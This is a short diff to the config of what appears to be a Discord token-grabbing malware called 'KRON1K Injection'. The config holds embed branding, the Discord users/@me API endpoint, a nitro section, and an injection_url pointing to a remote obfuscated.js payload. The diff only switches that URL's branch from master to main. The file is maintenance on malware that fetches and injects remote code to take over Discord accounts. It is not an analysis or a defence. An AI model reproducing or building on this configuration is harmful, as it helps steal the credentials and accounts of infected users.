@@ -14,7 +14,7 @@ const config = {
   embed_name: 'KRON1K Injection', 
   embed_icon: 'https://raw.githubusercontent.com/WEDALARISEWMEM/kronik-injection/main/imgs/pfp.png', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/WEDALARISEWMEM/kronik-injection/master/obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/WEDALARISEWMEM/kronik-injection/main/obfuscated.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
